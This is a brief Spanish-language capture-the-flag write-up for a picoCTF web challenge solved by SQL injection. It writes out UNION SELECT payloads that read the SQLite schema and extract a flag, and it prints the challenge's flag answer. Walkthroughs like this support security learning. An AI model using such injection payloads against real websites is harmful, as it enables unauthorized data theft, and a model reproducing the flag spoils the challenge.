
### Descripción 
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
### Solución
Conociendo el nombre de la tabla a buscar, buscamos la bandera con la siguiente sentencia 
	**'union select id,flag,3 from more_table;**

Solución: **picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}**
### Notas adicionales
	SQL injection consiste en poner una sentencia maliciosa sql mediante una entrada en la pagina web 

	Mediante la siguiente sentencia revisamos la estructura de las tablas 'union select sql,2,3 from sqlite_master;

	También se puede con burpSuite interceptando la solicitud post, en la respuesta sale la bandera
### Referencias 
https://www.youtube.com/watch?v=clMe4yqL6yU&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=63
